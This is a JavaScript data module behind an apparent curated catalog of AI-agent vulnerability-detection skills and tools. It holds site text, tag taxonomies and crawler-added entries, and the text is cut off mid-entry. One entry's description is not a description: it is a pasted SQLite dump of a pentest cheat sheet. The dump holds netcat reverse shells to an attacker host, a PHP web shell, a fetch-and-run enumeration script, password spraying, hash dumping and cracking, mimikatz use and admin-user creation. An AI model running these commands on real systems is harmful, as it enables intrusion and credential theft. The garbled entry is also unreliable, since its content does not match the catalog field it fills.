module.exports = {
  repo: {
    name: "Awesome Vulnerability Detection Skills",
    description:
      "A curated list of AI agent skills, workflows, MCP servers, and related tooling for vulnerability detection and security research.",
    audience:
      "For Claude Code, OpenClaw, Codex, Cursor, Gemini CLI, and adjacent agent runtimes.",
    githubUrl:
      "https://github.com/IIE-VARAS/awesome-vulnerability-detection-skills",
    githubPagesUrl:
      "https://iie-varas.github.io/awesome-vulnerability-detection-skills/"
  },
  readme: {
    heroTitle: "🛡️ Awesome Vulnerability Detection Skills",
    heroEyebrow: "Curated AI security catalog",
    overview: [
      "The canonical list lives in this README.",
      "The live catalog is published on GitHub Pages for search and filtering.",
      "A searchable static catalog is included in [`docs/index.html`](docs/index.html).",
      "Entries include both agent-native skills and standalone tools when they are useful in the same workflow.",
      "Every entry is tagged along three orthogonal dimensions — target, technique, and form — plus a platform tag."
    ],
    platformNote:
      "Most `CC` skills with a standard `SKILL.md` layout can also be loaded into OpenClaw through a workspace skills directory.",
    contributingIntro: "Open a PR with:",
    contributingItems: [
      "Project name",
      "Repository link",
      "One-sentence description",
      "Applicable platform tags: `CC`, `OC`, `CX`, `MCP`, `OAI`, `TOOL`",
      "Dimension tags: target, technique, and form (see tables below)"
    ],
    contributingNote:
      "Prefer entries that are clearly maintained, practically usable, and specific about what the skill or tool actually does.",
    liveCatalogLabel: "Open Live Catalog"
  },
  site: {
    eyebrow: "Curated catalog",
    title: "🛡️ Awesome Vulnerability Detection Skills",
    subtitle:
      "A searchable catalog of AI agent skills, workflows, MCP servers, and tools for vulnerability detection and security research.",
    audience:
      "For Claude Code, OpenClaw, Codex, Cursor, Gemini CLI, and adjacent agent runtimes.",
    metaDescription:
      "A searchable catalog of AI agent skills, workflows, MCP servers, and tools for vulnerability detection and security research.",
    howToUseTitle: "How to use this list",
    howToUseText:
      "Filter by target, technique, form, or platform tag, search by capability or project name, then jump to the original repository for setup details.",
    scopeTitle: "Scope",
    scopeText:
      "This catalog mixes native agent skills with adjacent tools when they serve the same security workflow. Every entry is tagged along three orthogonal dimensions.",
    searchLabel: "Search the catalog",
    searchPlaceholder:
      "Search by name, capability, tag, or keyword...",
    legendTitle: "Platform Tags",
    legendNote:
      "Most standard CC skills can also be adapted to OpenClaw-style workspace skill loading.",
    targetFilterTitle: "Filter by target",
    targetFilterText:
      "What does the skill analyze or operate on?",
    techniqueFilterTitle: "Filter by technique",
    techniqueFilterText:
      "What security analysis method does the skill use?",
    formFilterTitle: "Filter by form",
    formFilterText:
      "How is the skill packaged or delivered?",
    platformFilterTitle: "Filter by platform",
    platformFilterText:
      "Narrow results to the runtimes or packaging styles you care about.",
    resultsTitle: "Skill cards",
    resultsText:
      "Browse the visible results directly. Search is optional; filters work without typing anything.",
    allTargetsLabel: "All targets",
    allTechniquesLabel: "All techniques",
    allFormsLabel: "All forms",
    allPlatformsLabel: "All platforms",
    selectionTitle: "Install prompt builder",
    selectionText:
      "Select the skills or repos you want, then copy a ready-to-send prompt for your agent.",
    selectionCountLabel: "Selected skills",
    selectionEmpty:
      "No skills selected yet. Tick one or more entries below to generate an installation prompt.",
    promptLabel: "Generated install prompt",
    copyPromptLabel: "Copy prompt",
    clearSelectionLabel: "Clear selection",
    promptCopiedLabel: "Copied",
    openRepoLabel: "Open repo",
    noResultsText:
      "No entries matched the current filters."
  },

  // --- Platform tags (unchanged) ---
  tags: [
    {
      id: "CC",
      label: "CC",
      readmeLabel: "CC",
      description: "Claude Code skill or workflow"
    },
    {
      id: "OC",
      label: "OC",
      readmeLabel: "OC",
      description: "OpenClaw-compatible skill or runtime"
    },
    {
      id: "CX",
      label: "CX",
      readmeLabel: "CX",
      description: "Codex-compatible skill"
    },
    {
      id: "MCP",
      label: "MCP",
      readmeLabel: "MCP",
      description: "MCP server usable from MCP-compatible agents"
    },
    {
      id: "OAI",
      label: "OAI",
      readmeLabel: "OAI",
      description: "OpenAI Agents SDK or OpenAI platform workflow"
    },
    {
      id: "TOOL",
      label: "🔧 Tool",
      readmeLabel: "🔧",
      description: "Standalone tool or framework"
    }
  ],

  // --- Multi-dimensional tag definitions ---
  tagDimensions: [
    {
      id: "target",
      title: "Target",
      description: "What does the skill analyze or operate on?",
      emoji: "🎯",
      values: [
        { id: "source",         label: "Source Code",     description: "Language-agnostic source code analysis" },
        { id: "web",            label: "Web",             description: "Web applications, APIs, HTTP" },
        { id: "binary",         label: "Binary",          description: "Binaries, ELF, PE, firmware" },
        { id: "mobile",         label: "Mobile",          description: "Android APK, iOS applications" },
        { id: "smart-contract", label: "Smart Contract",  description: "Solidity, EVM, blockchain" },
        { id: "container",      label: "Container",       description: "Docker, Kubernetes, cloud config" },
        { id: "supply-chain",   label: "Supply Chain",    description: "Dependencies, packages, SCA" },
        { id: "agent",          label: "Agent",           description: "AI skills, MCP servers, prompts" },
        { id: "general",        label: "General",         description: "Cross-domain or not target-specific" }
      ]
    },
    {
      id: "technique",
      title: "Technique",
      description: "What security analysis method does it employ?",
      emoji: "⚙️",
      values: [
        { id: "static-analysis",     label: "Static Analysis",     description: "All forms of analysis without execution (SAST, code review, formal verification, rule scanning)" },
        { id: "dynamic-testing",     label: "Dynamic Testing",     description: "Runtime / interactive testing (DAST, pentest)" },
        { id: "fuzzing",             label: "Fuzzing",             description: "Automated input generation for bug discovery" },
        { id: "reverse-engineering", label: "Reverse Engineering", description: "Binary analysis, decompilation, artifact extraction" },
        { id: "threat-modeling",     label: "Threat Modeling",     description: "Architecture-level threat identification (STRIDE, etc.)" },
        { id: "compliance",          label: "Compliance",          description: "Standard / specification conformance checking" },
        { id: "recon",               label: "Recon",               description: "Reconnaissance, OSINT, information gathering" },
        { id: "exploit-dev",         label: "Exploit Dev",         description: "Exploit development, PoC creation" }
      ]
    },
    {
      id: "form",
      title: "Form",
      description: "How is the skill packaged or delivered?",
      emoji: "📦",
      values: [
        { id: "prompt-skill",     label: "Prompt Skill",     description: "Pure knowledge / instruction (SKILL.md)" },
        { id: "tool-wrapper",     label: "Tool Wrapper",     description: "Wraps external CLI tools" },
        { id: "workflow",         label: "Workflow",          description: "Multi-step orchestrated pipeline" },
        { id: "agent-framework",  label: "Agent Framework",  description: "Autonomous agent system" },
        { id: "knowledge-base",   label: "Knowledge Base",   description: "Reference material, checklists, paper collection" },
        { id: "catalog",          label: "Catalog",           description: "Curated index or list" },
        { id: "mcp-server",       label: "MCP Server",       description: "MCP tool server" },
        { id: "suite",            label: "Suite",             description: "Comprehensive multi-capability bundle" }
      ]
    }
  ],

  // --- Flat entry list with multi-dimensional tags ---
  entries: [
    // ── Added by crawler 2026-04-15 ──
    {
      name: "agent-security-scanner-mcp",
      url: "https://github.com/sinewaveai/agent-security-scanner-mcp",
      tags: ["CC", "MCP"],
      target: ["supply-chain", "agent"],
      technique: ["static-analysis"],
      form: ["mcp-server"],
      desc: "Security scanner MCP server for AI coding agents. Prompt injection firewall, package hallucination detection (4.3M+ packages), 1000+ vulnerability rules with AST & taint analysis, auto-fix"
    },
    {
      name: "ultraship",
      url: "https://github.com/Houseofmvps/ultraship",
      tags: ["CC"],
      target: ["binary", "supply-chain", "agent"],
      technique: ["dynamic-testing"],
      form: ["workflow"],
      desc: "\"ULTRASHIP\" Claude Code plugin — 39 skills, 33 tools, 11 agents for ship-ready workflows: planning, review, pentesting, safety guardrails, canary monitoring, SEO/AI-readiness check, penetration testing, code review, competitive analysis, incident response. 1 dependency. 180 tests. MIT"
    },
    {
      name: "claude-security-audit",
      url: "https://github.com/VicKayro/claude-security-audit",
      tags: ["CC"],
      target: ["web", "agent"],
      technique: ["compliance"],
      form: ["prompt-skill"],
      desc: "Skill Claude Code pour audit de sécurité complet (OWASP Top 10, CWE/CVE, headers, auth, paywall, infra)"
    },
    {
      name: "openclaw-skills-security",
      url: "https://github.com/UseAI-pro/openclaw-skills-security",
      tags: ["CC"],
      target: ["binary", "supply-chain", "agent"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "Curated, security-first OpenClaw skills (Markdown-based). Security audit skills - detect prompt injection, supply chain attacks, credential leaks. Works with Codex CLI, Claude Code, any LLM"
    },
    {
      name: "AegisGate",
      url: "https://github.com/ax128/AegisGate",
      tags: ["CC", "OAI", "MCP"],
      target: ["web", "binary", "agent"],
      technique: ["exploit-dev"],
      form: ["prompt-skill"],
      desc: "Open-source security gateway for LLM APIs — prompt injection detection, PII redaction, dangerous response   sanitization, and audit logging. OpenAI/Claude compatible, MCP & Agent SKILL support. Drop-in proxy for AI coding   agents (Cursor, Claude Code, Codex)"
    },
    {
      name: "secpipe",
      url: "https://github.com/FuzzingLabs/secpipe",
      tags: ["MCP"],
      target: ["binary", "agent", "source"],
      technique: ["static-analysis", "dynamic-testing", "fuzzing"],
      form: ["mcp-server"],
      desc: "MCP server for AI-driven security pipelines"
    },
    {
      name: "mcp-dnstwist",
      url: "https://github.com/BurtTheCoder/mcp-dnstwist",
      tags: ["MCP"],
      target: ["agent"],
      technique: ["fuzzing"],
      form: ["mcp-server"],
      desc: "MCP server for dnstwist, a powerful DNS fuzzing tool that helps detect typosquatting, phishing, and corporate espionage"
    },
    {
      name: "mcp-server-fuzzer",
      url: "https://github.com/Agent-Hellboy/mcp-server-fuzzer",
      tags: ["MCP"],
      target: ["agent"],
      technique: ["fuzzing"],
      form: ["mcp-server"],
      desc: "A generic mcp server fuzzer"
    },
    {
      name: "Zen-Ai-Pentest",
      url: "https://github.com/SHAdd0WTAka/Zen-Ai-Pentest",
      tags: ["CC"],
      target: ["binary", "agent"],
      technique: ["static-analysis", "dynamic-testing", "compliance"],
      form: ["agent-framework"],
      desc: "🛡⚔️AI-Powered Penetration Testing Framework with automated vulnerability scanning, multi-agent system, and compliance reporting🛡⚔️"
    },
    {
      name: "Hack-SQL",
      url: "https://github.com/Don-No7/Hack-SQL",
      tags: ["CC"],
      target: ["web", "binary", "agent"],
      technique: ["static-analysis", "dynamic-testing", "fuzzing", "reverse-engineering", "recon", "exploit-dev"],
      form: ["tool-wrapper"],
      desc: "-- -- File generated with SQLiteStudio v3.2.1 on Sun Feb 7 14:58:28 2021 -- -- Text encoding used: System -- PRAGMA foreign_keys = off; BEGIN TRANSACTION;  -- Table: Commands CREATE TABLE Commands (Command_No INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, Name TEXT REFERENCES Programs (Name) NOT NULL, Description TEXT NOT NULL, Command TEXT, File BLOB); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (1, 'Kerbrute', 'brute single user password', 'kerbrute bruteuers [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (2, 'Kerbrute', 'brute username:password combos from file or stdin', 'kerbrute brutforce [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (3, 'Kerbrute', 'test a single password agains a list of users', 'kerbrute passwordspray [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (4, 'Kerbrute', 'Enumerate valid domain usernames via kerberos', 'kerbrute userenum [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (5, 'Name-That-Hash', 'Find the hash type of a string', 'nth --text ''<hash>''', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (6, 'Name-That-Hash', 'Find the hash type of a file', 'nth --file <hash file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (7, 'Nmap', 'scan for vulnerabilites', 'nmap --script vuln <HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (8, 'Nikto', 'Scan host for vulnerabilites', 'nikto -h <HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (9, 'SMBClient', 'check for misconfigured anonymous login', 'smbclient -L \\\\<HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (10, 'Hydra', 'Brutforce a webpage looking for usernames', 'hydra -l <user wordlist> -p 123 <HOST_IP> http-post-form ''/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=<output string on failure>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (11, 'SMBMap', 'enumerates SMB file shares', 'smbmap -u <user> -p <pass> -H <host IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (12, 'WPScan', 'Enumerate Wordpress website', 'wpscan --url <wp site> --enumerate --plugins-detection', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (13, 'WPScan', 'enumerate though known usernames', 'wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (14, 'PowerShell', 'bypass execution policy', 'powershell.exe -exec bypass', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (15, 'TheHarvester', 'gathering informaiton from online sources', 'theharvester -d <domain> -l <#> -g -b google', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (16, 'Netcat', 'open a listener', 'nc -lvnp <port #>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (17, 'Netcat', 'Connect to computer', 'nc <attacker ip> <attacker port>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (18, 'GoBuster', 'Eunmerate directories on a website with a cookie', 'gobuster dir -u http://<IP> -w <wordlist> -x <extention> -c PHPSESSID=<cookie val>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (19, 'SQLMap', 'map sql at an IP', 'sqlmap -r <IP> --batch --force-ssl', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (20, 'John the Ripper', 'Use wordlist to parse hash', 'john <HASHES_FILE> --wordlist=<wordlist>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (21, 'John the Ripper', 'unencrypt shadow file', 'john <Unshadowed passwds>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (22, 'Unshadow', 'combine /etc/passwd and /etc/shadow file for cracking', 'unshadow <passwd> <shadow>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (23, 'Hashcat', 'crack hashes with a wordlist', 'hashcat -m <hash type> -a 0 -o <output file> <hash file> <wordlist> --force', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (26, 'Enum4Linux', 'basic command', 'enum4linux -a <IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (27, 'SMBClient', 'connect to a SMB share', 'smbclinet //<IP>/<share> -U <username>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (28, 'Netcat', 'connect with shell (-e doest always work)', 'nc -e /bin/sh <ATTACKING-IP> 80', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (29, 'Netcat', 'connect with shell (-e doest always work)', '/bin/sh | nc ATTACKING-IP 80', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (30, 'Netcat', 'done on the target', 'rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (31, 'SQLMap', 'Check form for SQL injection', 'sqlmap -o -u \"http://meh.com/form/\" –forms', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (32, 'SQLMap', 'automated SQL scan', 'sqlmap -u <URL> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (33, 'CrackMapExec', 'run a mimikatz module', 'crackmapexec smb <target(s)> -u <username> -p <password> --local-auth -M mimikatz', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (34, 'CrackMapExec', 'Command execution', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' -x whoami', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (35, 'CrackMapExec', 'check logged in users', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' --lusers', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (36, 'CrackMapExec', 'dump local SAM hashes', 'crackmapexec <target(s)> -u ''<uesrname>'' -p ''<password>'' --local-auth --sam', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (37, 'CrackMapExec', 'null session login', 'crackmapexec smb <target(s)> -u '''' -p ''''', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (38, 'CrackMapExec', 'list modules', NULL, NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (39, 'CrackMapExec', 'pass the hash', NULL, NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (41, 'IKE-Scan', 'attack pre shared key with dictionary', 'psk-crack -d </path/to/dictionary> <psk file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (42, 'IKE-Scan', 'If you find a SonicWALL VPN using agressive mode it will require a group id, the default group id is GroupVPN', 'ike-scan <IP> -A -id GroupVPN', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (43, 'IKE-Scan', 'to find aggressive mode VPNs and save for use with psk-crack', 'ike-scan <IP> -A -P<file out>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (44, 'John the Ripper', 'crack passwords with korelogic rules', 'for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do ./john --rules:${ruleset} -w:<wordlist> <password_file> ; done', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (45, 'Nmap', 'create a list of ip addresses ', 'nmap -sL -n 192.168.1.1-100,102-254 | grep \"report for\" | cut -d \" \" -f 5 > ip_list_192.168.1.txt', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (46, 'Linux commands', 'mount NFS share on linux', 'mount -t nfs server:/share /mnt/point', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (47, 'PowerShell', 'create new user', 'net user <username> <password> /ADD', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (48, 'PowerShell', 'add user to a group (normaly Administrators)', 'net localgroup <group> <username> /ADD', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (49, 'PSK-Crack', 'brute force with specified length and specified chars (if left blank default is 36)', 'psk-crack -b <#> --charset=\"<charlist>\" <key file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (50, 'PSK-Crack', 'dictianary attack', 'psk-crack -d <file> <key file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (51, 'SQLMap', 'check form for SQL injection', 'sqlmap -o -u \"<url of form>\" --forms', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (52, 'SQLMap', 'Scan url for union + error based injection with mysql backend and use a random user agent + database dump', 'sqlmap -u \"<form URL>?id=1>\"  --dbms=mysql --tech=U --random-agent --dump ', NULL);  -- Table: Exploits CREATE TABLE Exploits (Target TEXT, Type TEXT, Criteria TEXT, Method TEXT, Code TEXT, Result TEXT, Notes TEXT); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Injection', 'ability to write to website folder', 'create or edit a mage of the website and insert the code to get remote access to the machine', '<? php system ($ _ GET [''cmd'']); ?>', 'execute code via url', '<URL of php>?cmd=<code to execue>'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'shell', 'enter code into the shell to find vulnerbilities int he machine', 'find / -perm -u=s -type f 2>/dev/null', 'SUID binaries', 'link output to GTFO bins and exploit'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Box', 'Priv Esc', 'Python binary running as root', 'generate a shell using python to grain root access', 'python3 -c \"import pty;pty.spawn(''/bin/sh'');\"', 'root shell', 'change pyton varibale acordingly'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('SQL', 'Priv Esc', 'MySQL binary running as root', 'enter into MySQL command line and break out into root y using the code', 'mysql> \! /bin/sh', 'get shell from root priv SQL', NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'low privilage shell', 'use the code to search for programs that run as sudo without password', 'sudo -l', NULL, 'list programs that can be used with sudo and no password'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Windows', 'Priv Esc', 'Powershell', 'use code to enumerate priv esc opertunities', 'wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\windows\\\" |findstr /i /v \"\"\"', 'list of unquoted service paths that might be used for priv esc', NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'LFI', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', NULL, 'use Linenum.sh to enumerate linux box', 'wget https://www.linenum.sh/ -P /dev/shm/Linenum.sh; chmod +x /dev/shm/linenum.sh ; ./dev/shm/Linenum.sh | tee /dev/shm/lininfo.txt', ' file, /dev/shm/lininfo.txt, with priv esc info', 'it is possible to use other methods of download like: curl or others found on google'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'No-Auth', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Re-Registration', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'JWT', 'a site that uses jSON as cookies', 'edit the information (with BURP) thats going to the website to gain access without authenitaction', NULL, NULL, NULL);  -- Table: Programs CREATE TABLE Programs (Name text PRIMARY KEY NOT NULL UNIQUE, Stage TEXT, Description text, Info text, Features TEXT, Target TEXT, Offensive BOOLEAN, commands TEXT); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nmap', 'Enum', 'Used for scanning a network/host to gather more information', 'man pages on linux', 'Scanning', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('BURP Suit', 'Enum, Exploit', 'A program for manipulating HTTP requests, enumeration and Exploit', 'https://portswigger.net/burp/documentation/contents', 'Brute', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Metasploit', 'All', 'Powerfull swiss-army-knife of hacking', 'https://docs.rapid7.com/metasploit/', NULL, 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('MSFVenom', 'Exploit', 'Designed for creating payloads', 'https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom', 'Payloads', 'OS', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Snort', 'Utility', 'Packet sniffer', 'https://snort-org-site.s3.amazonaws.com/production/document_files/files/000/000/249/original/snort_manual.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIXACIED2SPMSC7GA%2F20210128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210128T192737Z&X-Amz-Expires=172800&X-Amz-SignedHeaders=host&X-Amz-Signature=4b51dc730677d14203c4a4cde25c1831ac64e9eca8df89c6737701811fa3f9fd', 'Sniffing', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('GoBuster', 'Enum', 'A fuzzer for websites', 'man pages on linux', 'Fuzzing', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hydra', 'Exploit', 'Brutforcer for wesite passwords', 'man pages on linux', 'Brute', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Mimikatz', 'Post', 'Used to exploit kerberos', 'https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Impacket', 'Exploit', 'The fascilitator of python bassed script that uses modules for attacking windows ', 'https://www.secureauth.com/labs-old/impacket/', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Enum4Linux', 'Enum', 'for Enumerating Windows and Samba hosts', 'man pages included, https://tools.kali.org/information-gathering/enum4linux', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Rubeus', 'Exploit', 'Used for kerberos interaction and abuse', 'https://github.com/GhostPack/Rubeus', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Kerbrute', 'Enum, Exploit', 'quickly enumerate and brutforce active directory accounts through kerberos pre-authentication', 'https://github.com/ropnop/kerbrute/', 'Brute', 'Windows', 'Y', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('John the Ripper', 'Exploit', 'a password brutforcer', 'https://www.openwall.com/john/doc/', 'Brute', 'Hash', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hashcat', 'Exploit', 'A password bruteforces', 'http://manpages.org/hashcat', 'Brute', 'Hash', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Bloodhound', 'Enum', 'Network mapping tool', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux', NULL, 'N/A', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Wireshark', 'Utility', 'Packet sniffer', 'https://www.wireshark.org/download/docs/user-guide.pdf', 'Sniffing', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hash-Identifier', 'Utility', '(superseeded by Name-That-Hash)A simple python program for identifying hashes', 'man pages on linux', NULL, 'Hash', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Scp', 'Utility', 'For transfering files over SSH connection', 'man pages on llinux', 'Connect', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBClient', 'Utility', 'Used to connect to SMB file shares, can be used to enumerate shares', 'man pages on linux', 'Connect', 'SMB', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PowerShell', 'Utility', 'Powerfull comand line for Windows', 'https://www.pdq.com/powershell/', NULL, 'Windows', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Searchsploit', 'Enum', 'Local version of ExploitDB', 'https://www.exploit-db.com/searchsploit', 'Exploit Enum', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Vim', 'Utiility', 'Text editor', 'https://vimhelp.org/', NULL, 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('LinPeas', 'Post', 'For Enumerating Linux computers', 'Simply run on a linux computer', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nikto', 'Enum', 'For full enumeration on websites', 'https://cirt.net/nikto2-docs/', 'Exploit Enum', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Radare2', 'Utility', 'A tooll used to reverse engineer programs', 'https://github.com/radareorg/radare2/blob/master/doc/intro.md', 'Reverse', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Evil-WinRM', 'Exploit', 'Malware exuivilent of WinRM and used to exploit windows systems', 'https://github.com/Hackplayers/evil-winrm', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Seatbelt', 'Post', 'Seatbelt is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives', 'https://github.com/GhostPack/Seatbelt', 'Exploit Enum', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WinPeas', 'Post', 'For full enumeration of windows host (internal)', 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS', 'Exploit Enum', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Lockless', 'Post', 'LockLess is a C# tool that allows for the enumeration of open file handles and the copying of locked files', 'https://github.com/GhostPack/Lockless', 'File interaction', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SQLMap', 'Exploit', 'Automates the process of detecting and exploiting SQL injection flaws and taking over of database servers', 'http://sqlmap.org/', 'SQLi', 'SQL', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('KEETheif', 'Post', 'Allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system', 'https://github.com/GhostPack/KeeThief', 'File interacction', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('TheHarvester', 'Enum', 'The 